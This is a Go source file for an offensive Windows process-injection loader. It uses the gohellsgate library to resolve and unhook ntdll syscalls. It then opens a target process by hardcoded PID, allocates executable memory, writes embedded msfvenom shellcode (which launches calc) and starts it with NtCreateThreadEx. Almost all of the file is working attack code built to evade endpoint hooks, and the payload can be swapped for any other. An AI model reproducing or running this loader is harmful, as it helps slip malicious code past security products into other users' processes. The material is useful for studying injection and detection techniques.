package main

import (
	"dirsyscall/functions"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	"github.com/scriptchildie/gohellsgate"

	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func main() {
	pid := 13020
	// msfvenom -f hex -p windows/x64/exec cmd=calc
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")

	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	exports, _ := gohellsgate.GetModuleExports("ntdll.dll")
	gohellsgate.GetSyscallNumbers(&exports)
	gohellsgate.UnhookSyscalls(&exports)

	NtOpenProcessSyscallNo, _ := gohellsgate.GetSyscallNoFromName("NtOpenProcess", &exports)

	NtAllocateVirtualMemorySyscallNo, _ := gohellsgate.GetSyscallNoFromName("NtAllocateVirtualMemory", &exports)

	handle := functions.NtOpenProcessSyscall(NtOpenProcessSyscallNo, uintptr(PROCESS_ALL_ACCESS), pid)

	BaseAddress := NtAllocateVirtualMemorySyscall(NtAllocateVirtualMemorySyscallNo, uintptr(*handle), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)

	NtWriteVirtualMemorySyscallNo, _ := gohellsgate.GetSyscallNoFromName("NtWriteVirtualMemory", &exports)

	NtWriteVirtualMemory(NtWriteVirtualMemorySyscallNo, uintptr(*handle), BaseAddress, sc)

	NtCreateThreadExSyscallNo, _ := gohellsgate.GetSyscallNoFromName("NtCreateThreadEx", &exports)

	NtCreateThreadEx(NtCreateThreadExSyscallNo, uintptr(*handle), BaseAddress)

}

func NtAllocateVirtualMemorySyscall(syscallno byte, handle uintptr, length uintptr, alloctype int, protect int) uintptr {
	/*
			__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
		  [in]      HANDLE    ProcessHandle, 1
		  [in, out] PVOID     *BaseAddress,  2
		  [in]      ULONG_PTR ZeroBits,      3
		  [in, out] PSIZE_T   RegionSize,    4
		  [in]      ULONG     AllocationType,5
		  [in]      ULONG     Protect        6
		);*/
	// syscall for NtAllocateVirtualMemory

	var BaseAddress uintptr

	err1, err := gohellsgate.Syscall(
		uint16(syscallno),
		uintptr(unsafe.Pointer(handle)),       //1
		uintptr(unsafe.Pointer(&BaseAddress)), //2
		0,                                     //3
		uintptr(unsafe.Pointer(&length)),      //4
		uintptr(0x3000),                       //5
		0x40,                                  //6
	)
	if err != nil {
		fmt.Printf("1 %s %x\n", err, err1)
	}
	//fmt.Printf("%p\n", unsafe.Pointer(BaseAddress))

	return BaseAddress
}

func NtWriteVirtualMemory(syscallno byte, handle, BaseAddress uintptr, shc []byte) {
	/*
		NtWriteVirtualMemory(
		  IN HANDLE               ProcessHandle, 					1
		  IN PVOID                BaseAddress,  					2
		  IN PVOID                Buffer,							3
		  IN ULONG                NumberOfBytesToWrite,				4
		  OUT PULONG              NumberOfBytesWritten OPTIONAL );  5
	*/
	var NumberOfBytesWritten uintptr
	NumberOfBytesToWrite := uintptr(len(shc))
	fmt.Printf("NumberOfBytesToWrite: %v\n", NumberOfBytesToWrite)
	err1, err := gohellsgate.Syscall(
		uint16(syscallno),
		handle,                                         //1
		uintptr(unsafe.Pointer(BaseAddress)),           //2
		uintptr(unsafe.Pointer(&shc[0])),               //3
		NumberOfBytesToWrite,                           //4
		uintptr(unsafe.Pointer(&NumberOfBytesWritten)), //5
	)
	if err != nil {
		fmt.Printf("1 %s %x\n", err, err1)
	}
	fmt.Printf("NumberOfBytesWritten: %v\n", NumberOfBytesWritten)

}

func NtCreateThreadEx(syscallno byte, handle, BaseAddress uintptr) uintptr {

	/*
	   typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	     OUT PHANDLE hThread,               1
	     IN ACCESS_MASK DesiredAccess,	    2
	     IN PVOID ObjectAttributes,	        3
	     IN HANDLE ProcessHandle,		    4
	     IN PVOID lpStartAddress,			5
	     IN PVOID lpParameter,				6
	     IN ULONG Flags,					7
	     IN SIZE_T StackZeroBits,			8
	     IN SIZE_T SizeOfStackCommit,		9
	     IN SIZE_T SizeOfStackReserve,		10
	     OUT PVOID lpBytesBuffer			11
	   );
	*/

	var hThread uintptr
	DesiredAccess := uintptr(0x1FFFFF)
	err1, err := gohellsgate.Syscall(
		uint16(syscallno),
		uintptr(unsafe.Pointer(&hThread)),    //1
		DesiredAccess,                        //2
		0,                                    //3
		uintptr(unsafe.Pointer(handle)),      //4
		uintptr(unsafe.Pointer(BaseAddress)), //5
		0,                                    //6
		uintptr(0),                           //7
		0,                                    //8
		0,                                    //9
		0,                                    //10
		0,
	)
	if err != nil {
		fmt.Printf("1 %s %x\n", err, err1)
	}
	fmt.Printf("hThread: %v\n", hThread)
	syscall.WaitForSingleObject(syscall.Handle(hThread), 0xffffffff)
	return hThread
}
